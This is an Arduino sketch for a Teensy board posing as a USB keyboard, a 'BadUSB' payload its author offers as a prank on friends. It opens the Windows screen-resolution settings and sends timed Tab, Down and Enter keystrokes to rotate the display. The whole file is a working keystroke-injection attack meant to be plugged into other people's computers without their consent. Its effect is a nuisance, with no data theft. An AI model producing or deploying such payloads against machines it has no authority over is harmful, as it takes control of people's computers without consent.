/*

TeensyDuino ( BadUSB) Like a Rubber Ducky )
 
You can buy Teensy >> ( https://www.pjrc.com/teensy/teensyduino.html )

Tutorial >> ( https://www.pjrc.com/teensy/teensyduino.html ) , Youtube.com or Google.com :>

PAYLOAD : 


WINDOWS SCREEN ROTATION ( PRANK ) YOUR FRIENDS :> 


@ Edo -m- you can contact me in screetsec@gmail.com

*/



int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 13
#endif

void setup()
{

  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);
  // turn the LED on while running
  digitalWrite(LED_PIN, HIGH);
  
  delay(5000);
  Screen_resol();
  
  delay(2000);
  Bebe();

  delay(1000);
  Bebe();

  delay(1000);
  Bebe();

  delay(1000);
  Down();

  delay(1000);
  Down();

  delay(1000);
  Bebe();

  delay(1000);
  Bebe();

  delay(1000);
  Bebe();

  delay(1000);
  Bebe();

  delay(200);
  Bebe();

  delay(1000);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(1000);
  Bebe();

  delay(1000);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
}

void loop(){
    // blink quickly when complete
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}


void Down(){
  Keyboard.set_key1(KEY_DOWN);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void Bebe(){
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void Screen_resol(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  delay(1000);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(2000);
  Keyboard.print("Screen resolution");

  delay(1000);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

